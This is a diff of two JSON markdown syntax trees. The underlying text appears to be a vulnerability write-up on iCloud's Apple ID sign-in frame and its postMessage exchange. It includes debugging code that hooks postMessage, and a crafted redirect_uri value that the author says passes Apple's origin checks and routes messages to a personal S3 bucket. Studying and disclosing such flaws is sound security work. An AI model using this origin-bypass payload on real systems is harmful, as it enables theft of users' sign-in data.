<           "value": " on the 'network' panel with the other HTTP requests. Additionally to this, if you set up some code to watch ",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 226,
<               "offset": 34046
<             },
<             "end": {
<               "line": 718,
<               "column": 335,
<               "offset": 34155
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 335,
<               "offset": 34155
<             },
<             "end": {
<               "line": 718,
<               "column": 348,
<               "offset": 34168
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " traffic across the browser you neeed to get it in ",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 348,
<               "offset": 34168
<             },
<             "end": {
<               "line": 718,
<               "column": 399,
<               "offset": 34219
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
11519,11520c18310,18329
<               "type": "text",
<               "value": "fast",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This is a very tricky URL to construct, as it has to satisfy all systems without crashing, and it does, as follows:",
>                   "position": {
>                     "start": {
>                       "line": 1039,
>                       "column": 1,
>                       "offset": 51599
>                     },
>                     "end": {
>                       "line": 1039,
>                       "column": 116,
>                       "offset": 51714
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
11523,11525c18332,18334
<                   "line": 718,
<                   "column": 400,
<                   "offset": 34220
---
>                   "line": 1039,
>                   "column": 1,
>                   "offset": 51599
11528,11530c18337,18339
<                   "line": 718,
<                   "column": 404,
<                   "offset": 34224
---
>                   "line": 1039,
>                   "column": 116,
>                   "offset": 51714
11534,12206d18342
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 399,
<               "offset": 34219
<             },
<             "end": {
<               "line": 718,
<               "column": 405,
<               "offset": 34225
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". This whole exchange happens in the first second or so of the page loading in.",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 405,
<               "offset": 34225
<             },
<             "end": {
<               "line": 718,
<               "column": 484,
<               "offset": 34304
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 718,
<           "column": 1,
<           "offset": 33821
<         },
<         "end": {
<           "line": 718,
<           "column": 484,
<           "offset": 34304
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I can set a break point on ",
<           "position": {
<             "start": {
<               "line": 720,
<               "column": 1,
<               "offset": 34308
<             },
<             "end": {
<               "line": 720,
<               "column": 28,
<               "offset": 34335
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "load",
<           "position": {
<             "start": {
<               "line": 720,
<               "column": 28,
<               "offset": 34335
<             },
<             "end": {
<               "line": 720,
<               "column": 34,
<               "offset": 34341
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " to make the JavaScript stop just as the page loads in, and then run in the console:",
<           "position": {
<             "start": {
<               "line": 720,
<               "column": 34,
<               "offset": 34341
<             },
<             "end": {
<               "line": 720,
<               "column": 118,
<               "offset": 34425
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 720,
<           "column": 1,
<           "offset": 34308
<         },
<         "end": {
<           "line": 720,
<           "column": 118,
<           "offset": 34425
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "window.addEventListener(\n    'message',\n    message => console.log(message)\n)",
<       "position": {
<         "start": {
<           "line": 722,
<           "column": 1,
<           "offset": 34429
<         },
<         "end": {
<           "line": 727,
<           "column": 4,
<           "offset": 34529
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If I do this, then whenever the iCloud page gets a message from the ",
<           "position": {
<             "start": {
<               "line": 729,
<               "column": 1,
<               "offset": 34533
<             },
<             "end": {
<               "line": 729,
<               "column": 69,
<               "offset": 34601
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 729,
<               "column": 69,
<               "offset": 34601
<             },
<             "end": {
<               "line": 729,
<               "column": 86,
<               "offset": 34618
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame, it'll print it to the console. With that, we end up with this:",
<           "position": {
<             "start": {
<               "line": 729,
<               "column": 86,
<               "offset": 34618
<             },
<             "end": {
<               "line": 729,
<               "column": 156,
<               "offset": 34688
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 729,
<           "column": 1,
<           "offset": 34533
<         },
<         "end": {
<           "line": 729,
<           "column": 156,
<           "offset": 34688
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"ready\"],\"id\":\"9BA799AA-6777-4DCC-A615-A8758C9E9CE2\"}\n\npmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"ready\",\"params\":[{\"iframeTitle\":\" Sign In with Your Apple ID\"}],\"id\":\"E0236187-9F33-42BC-AD1C-4F3866803C55\"}\n\npmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"config\"],\"id\":\"87A8E469-8A6B-4124-8BB0-1A1AB40416CD\"}\n\npmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"config\",\"params\":[],\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\"}",
<       "position": {
<         "start": {
<           "line": 731,
<           "column": 1,
<           "offset": 34692
<         },
<         "end": {
<           "line": 739,
<           "column": 4,
<           "offset": 35185
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The first thing I thought when I saw this was 'geez. that's complicated as hell'. This doesn't tell us a whole lot either, since our event listener only tells us what ",
<           "position": {
<             "start": {
<               "line": 741,
<               "column": 1,
<               "offset": 35189
<             },
<             "end": {
<               "line": 741,
<               "column": 168,
<               "offset": 35356
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 741,
<               "column": 168,
<               "offset": 35356
<             },
<             "end": {
<               "line": 741,
<               "column": 185,
<               "offset": 35373
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is sending us because the listener is only set on the outer ",
<           "position": {
<             "start": {
<               "line": 741,
<               "column": 185,
<               "offset": 35373
<             },
<             "end": {
<               "line": 741,
<               "column": 246,
<               "offset": 35434
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 741,
<               "column": 246,
<               "offset": 35434
<             },
<             "end": {
<               "line": 741,
<               "column": 258,
<               "offset": 35446
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " window. But, we are seeing the ",
<           "position": {
<             "start": {
<               "line": 741,
<               "column": 258,
<               "offset": 35446
<             },
<             "end": {
<               "line": 741,
<               "column": 290,
<               "offset": 35478
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "\"ready\"",
<           "position": {
<             "start": {
<               "line": 741,
<               "column": 290,
<               "offset": 35478
<             },
<             "end": {
<               "line": 741,
<               "column": 299,
<               "offset": 35487
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " message we saw in the code. We just need to know how to reply to it.",
<           "position": {
<             "start": {
<               "line": 741,
<               "column": 299,
<               "offset": 35487
<             },
<             "end": {
<               "line": 741,
<               "column": 368,
<               "offset": 35556
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 741,
<           "column": 1,
<           "offset": 35189
<         },
<         "end": {
<           "line": 741,
<           "column": 368,
<           "offset": 35556
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This is a situation I've not come across before. Because the ",
<           "position": {
<             "start": {
<               "line": 743,
<               "column": 1,
<               "offset": 35560
<             },
<             "end": {
<               "line": 743,
<               "column": 62,
<               "offset": 35621
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 743,
<               "column": 62,
<               "offset": 35621
<             },
<             "end": {
<               "line": 743,
<               "column": 79,
<               "offset": 35638
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame is being generated after page load, we need to bind an event to tell us what it's recieving just as it starts existing. My initial approach to this consisted of trying to use events to try to work out when the ",
<           "position": {
<             "start": {
<               "line": 743,
<               "column": 79,
<               "offset": 35638
<             },
<             "end": {
<               "line": 743,
<               "column": 296,
<               "offset": 35855
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "<iframe>",
<           "position": {
<             "start": {
<               "line": 743,
<               "column": 296,
<               "offset": 35855
<             },
<             "end": {
<               "line": 743,
<               "column": 306,
<               "offset": 35865
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is actually appended:",
<           "position": {
<             "start": {
<               "line": 743,
<               "column": 306,
<               "offset": 35865
<             },
<             "end": {
<               "line": 743,
<               "column": 328,
<               "offset": 35887
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 743,
<           "column": 1,
<           "offset": 35560
<         },
<         "end": {
<           "line": 743,
<           "column": 328,
<           "offset": 35887
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "((() => {\nconsole.log(\"postMessage hook added\");\nnew MutationObserver((mutations, observer) => {\nconst flatten = (a,c) => a.concat(c);\nconst allNodes =  mutations.filter(({ type }) => type == \"childList\")\n    .map(({ addedNodes }) => Array.from(addedNodes)).reduce(flatten, []);\n  \nallNodes\n  .forEach(parentNode => {\n    if (!parentNode.getElementsByTagName) return;\n    [...parentNode.getElementsByTagName(\"iframe\")].forEach(iframe => {\n      let x = iframe.contentWindow.postMessage;\n      console.log(\"hooked\", iframe);\n      iframe.contentWindow.postMessage = function(...a) {\n        console.log(`SEND to`, iframe, `${a}`);\n        x.apply(iframe, [...a]);\n      }\n    })\n  })\n  \n  \n}).observe(document.documentElement, {childList: true, subtree: true });\n\nwindow.addEventListener(\"message\", e => console.log(`RCV from`, e.origin, {...e}))\n})(),false);",
<       "position": {
<         "start": {
<           "line": 745,
<           "column": 1,
<           "offset": 35891
<         },
<         "end": {
<           "line": 771,
<           "column": 4,
<           "offset": 36793
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "As much time as it took to write this, it fails because the ",
<           "position": {
<             "start": {
<               "line": 773,
<               "column": 1,
<               "offset": 36797
<             },
<             "end": {
<               "line": 773,
<               "column": 61,
<               "offset": 36857
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 773,
<               "column": 61,
<               "offset": 36857
<             },
<             "end": {
<               "line": 773,
<               "column": 78,
<               "offset": 36874
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame is on a different origin to our embedding frame, ",
<           "position": {
<             "start": {
<               "line": 773,
<               "column": 78,
<               "offset": 36874
<             },
<             "end": {
<               "line": 773,
<               "column": 134,
<               "offset": 36930
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 773,
<               "column": 134,
<               "offset": 36930
<             },
<             "end": {
<               "line": 773,
<               "column": 146,
<               "offset": 36942
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". The browser, as mentioned before blocks pages that don't share the same domain from modifying each other.",
<           "position": {
<             "start": {
<               "line": 773,
<               "column": 146,
<               "offset": 36942
<             },
<             "end": {
<               "line": 773,
<               "column": 253,
<               "offset": 37049
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 773,
<           "column": 1,
<           "offset": 36797
<         },
<         "end": {
<           "line": 773,
<           "column": 253,
<           "offset": 37049
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The technique that I've found to work best is to use Google Chrome Dev tools' 'Advanced Breakpoint' feature. What it lets you do is inject code at a specific point in some code's execution. If your injected code returns ",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 1,
<               "offset": 37053
<             },
<             "end": {
<               "line": 775,
<               "column": 221,
<               "offset": 37273
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "true",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 221,
<               "offset": 37273
<             },
<             "end": {
<               "line": 775,
<               "column": 227,
<               "offset": 37279
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", then the execution stops. But rather than using it to break code, we instead use it to ",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 227,
<               "offset": 37279
12208,12218d18343
<             "end": {
<               "line": 775,
<               "column": 316,
<               "offset": 37368
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
12220,12221c18345,19316
<               "type": "text",
<               "value": "inject",
---
>               "type": "list",
>               "ordered": true,
>               "start": 1,
>               "spread": false,
>               "children": [
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "The Apple ID backend at ",
>                           "position": {
>                             "start": {
>                               "line": 1041,
>                               "column": 4,
>                               "offset": 51721
>                             },
>                             "end": {
>                               "line": 1041,
>                               "column": 28,
>                               "offset": 51745
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "idmsa.apple.com",
>                           "position": {
>                             "start": {
>                               "line": 1041,
>                               "column": 28,
>                               "offset": 51745
>                             },
>                             "end": {
>                               "line": 1041,
>                               "column": 45,
>                               "offset": 51762
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": "\ndecodes the ",
>                           "position": {
>                             "start": {
>                               "line": 1041,
>                               "column": 45,
>                               "offset": 51762
>                             },
>                             "end": {
>                               "line": 1042,
>                               "column": 13,
>                               "offset": 51776
>                             },
>                             "indent": [
>                               1
>                             ]
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "redirect_uri",
>                           "position": {
>                             "start": {
>                               "line": 1042,
>                               "column": 13,
>                               "offset": 51776
>                             },
>                             "end": {
>                               "line": 1042,
>                               "column": 27,
>                               "offset": 51790
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " ‘",
>                           "position": {
>                             "start": {
>                               "line": 1042,
>                               "column": 27,
>                               "offset": 51790
>                             },
>                             "end": {
>                               "line": 1042,
>                               "column": 29,
>                               "offset": 51792
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 1042,
>                               "column": 29,
>                               "offset": 51792
>                             },
>                             "end": {
>                               "line": 1042,
>                               "column": 111,
>                               "offset": 51874
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": "’",
>                           "position": {
>                             "start": {
>                               "line": 1042,
>                               "column": 111,
>                               "offset": 51874
>                             },
>                             "end": {
>                               "line": 1042,
>                               "column": 112,
>                               "offset": 51875
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1041,
>                           "column": 4,
>                           "offset": 51721
>                         },
>                         "end": {
>                           "line": 1042,
>                           "column": 112,
>                           "offset": 51875
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1041,
>                       "column": 1,
>                       "offset": 51718
>                     },
>                     "end": {
>                       "line": 1042,
>                       "column": 112,
>                       "offset": 51875
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "It (correctly) determines that the origin is ",
>                           "position": {
>                             "start": {
>                               "line": 1043,
>                               "column": 4,
>                               "offset": 51880
>                             },
>                             "end": {
>                               "line": 1043,
>                               "column": 49,
>                               "offset": 51925
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "wwww.icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 1043,
>                               "column": 49,
>                               "offset": 51925
>                             },
>                             "end": {
>                               "line": 1043,
>                               "column": 66,
>                               "offset": 51942
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " and allows the request through.",
>                           "position": {
>                             "start": {
>                               "line": 1043,
>                               "column": 66,
>                               "offset": 51942
>                             },
>                             "end": {
>                               "line": 1043,
>                               "column": 98,
>                               "offset": 51974
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1043,
>                           "column": 4,
>                           "offset": 51880
>                         },
>                         "end": {
>                           "line": 1043,
>                           "column": 98,
>                           "offset": 51974
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1043,
>                       "column": 1,
>                       "offset": 51877
>                     },
>                     "end": {
>                       "line": 1043,
>                       "column": 98,
>                       "offset": 51974
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "The Apple ID backend at ",
>                           "position": {
>                             "start": {
>                               "line": 1044,
>                               "column": 4,
>                               "offset": 51979
>                             },
>                             "end": {
>                               "line": 1044,
>                               "column": 28,
>                               "offset": 52003
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "idmsa.apple.com",
>                           "position": {
>                             "start": {
>                               "line": 1044,
>                               "column": 28,
>                               "offset": 52003
>                             },
>                             "end": {
>                               "line": 1044,
>                               "column": 45,
>                               "offset": 52020
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " returns the Content-Security Policy directive ‘",
>                           "position": {
>                             "start": {
>                               "line": 1044,
>                               "column": 45,
>                               "offset": 52020
>                             },
>                             "end": {
>                               "line": 1044,
>                               "column": 93,
>                               "offset": 52068
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "frame-ancestors https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 1044,
>                               "column": 93,
>                               "offset": 52068
>                             },
>                             "end": {
>                               "line": 1044,
>                               "column": 191,
>                               "offset": 52166
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": "’",
>                           "position": {
>                             "start": {
>                               "line": 1044,
>                               "column": 191,
>                               "offset": 52166
>                             },
>                             "end": {
>                               "line": 1044,
>                               "column": 192,
>                               "offset": 52167
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1044,
>                           "column": 4,
>                           "offset": 51979
>                         },
>                         "end": {
>                           "line": 1044,
>                           "column": 192,
>                           "offset": 52167
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1044,
>                       "column": 1,
>                       "offset": 51976
>                     },
>                     "end": {
>                       "line": 1044,
>                       "column": 192,
>                       "offset": 52167
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "This indicates to the browser the allowed origins ",
>                           "position": {
>                             "start": {
>                               "line": 1045,
>                               "column": 4,
>                               "offset": 52172
>                             },
>                             "end": {
>                               "line": 1045,
>                               "column": 54,
>                               "offset": 52222
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "https://s3-eu-west-1.amazonaws.com%3F",
>                           "position": {
>                             "start": {
>                               "line": 1045,
>                               "column": 54,
>                               "offset": 52222
>                             },
>                             "end": {
>                               "line": 1045,
>                               "column": 93,
>                               "offset": 52261
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": ", which doesn't exist and ",
>                           "position": {
>                             "start": {
>                               "line": 1045,
>                               "column": 93,
>                               "offset": 52261
>                             },
>                             "end": {
>                               "line": 1045,
>                               "column": 119,
>                               "offset": 52287
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "s3-eu-west-1.amazonaws.com",
>                           "position": {
>                             "start": {
>                               "line": 1045,
>                               "column": 119,
>                               "offset": 52287
>                             },
>                             "end": {
>                               "line": 1045,
>                               "column": 147,
>                               "offset": 52315
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " which is ",
>                           "position": {
>                             "start": {
>                               "line": 1045,
>                               "column": 147,
>                               "offset": 52315
>                             },
>                             "end": {
>                               "line": 1045,
>                               "column": 157,
>                               "offset": 52325
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "emphasis",
>                           "children": [
>                             {
>                               "type": "text",
>                               "value": "anything we put in our personal S3 bucket web server",
>                               "position": {
>                                 "start": {
>                                   "line": 1045,
>                                   "column": 158,
>                                   "offset": 52326
>                                 },
>                                 "end": {
>                                   "line": 1045,
>                                   "column": 210,
>                                   "offset": 52378
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
>                           "position": {
>                             "start": {
>                               "line": 1045,
>                               "column": 157,
>                               "offset": 52325
>                             },
>                             "end": {
>                               "line": 1045,
>                               "column": 211,
>                               "offset": 52379
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": ".",
>                           "position": {
>                             "start": {
>                               "line": 1045,
>                               "column": 211,
>                               "offset": 52379
>                             },
>                             "end": {
>                               "line": 1045,
>                               "column": 212,
>                               "offset": 52380
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1045,
>                           "column": 4,
>                           "offset": 52172
>                         },
>                         "end": {
>                           "line": 1045,
>                           "column": 212,
>                           "offset": 52380
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1045,
>                       "column": 1,
>                       "offset": 52169
>                     },
>                     "end": {
>                       "line": 1045,
>                       "column": 212,
>                       "offset": 52380
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "inlineCode",
>                           "value": "idmsa.apple.com",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 4,
>                               "offset": 52385
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 21,
>                               "offset": 52402
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " then generates ",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 21,
>                               "offset": 52402
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 37,
>                               "offset": 52418
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "bootData.destinationDomain = decodeURIComponent('https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com)",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 37,
>                               "offset": 52418
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 169,
>                               "offset": 52550
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": ". ",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 169,
>                               "offset": 52550
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 171,
>                               "offset": 52552
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "bootData.destinationDomain",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 171,
>                               "offset": 52552
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 199,
>                               "offset": 52580
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " gets set to ‘",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 199,
>                               "offset": 52580
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 213,
>                               "offset": 52594
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 213,
>                               "offset": 52594
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 293,
>                               "offset": 52674
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": "’ when the page loads.",
>                           "position": {
>                             "start": {
>                               "line": 1046,
>                               "column": 293,
>                               "offset": 52674
>                             },
>                             "end": {
>                               "line": 1046,
>                               "column": 315,
>                               "offset": 52696
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1046,
>                           "column": 4,
>                           "offset": 52385
>                         },
>                         "end": {
>                           "line": 1046,
>                           "column": 315,
>                           "offset": 52696
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1046,
>                       "column": 1,
>                       "offset": 52382
>                     },
>                     "end": {
>                       "line": 1046,
>                       "column": 315,
>                       "offset": 52696
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "When passed ",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 4,
>                               "offset": 52701
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 16,
>                               "offset": 52713
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 16,
>                               "offset": 52713
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 96,
>                               "offset": 52793
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " as ",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 96,
>                               "offset": 52793
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 100,
>                               "offset": 52797
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "targetOrigin",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 100,
>                               "offset": 52797
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 114,
>                               "offset": 52811
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": ", ",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 114,
>                               "offset": 52811
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 116,
>                               "offset": 52813
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "postMessage",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 116,
>                               "offset": 52813
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 129,
>                               "offset": 52826
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " parses out ",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 129,
>                               "offset": 52826
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 141,
>                               "offset": 52838
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "https://s3-eu-west-1.amazonaws.com",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 141,
>                               "offset": 52838
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 177,
>                               "offset": 52874
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " to be the correct target origin, which allows us to get ",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 177,
>                               "offset": 52874
>                             },
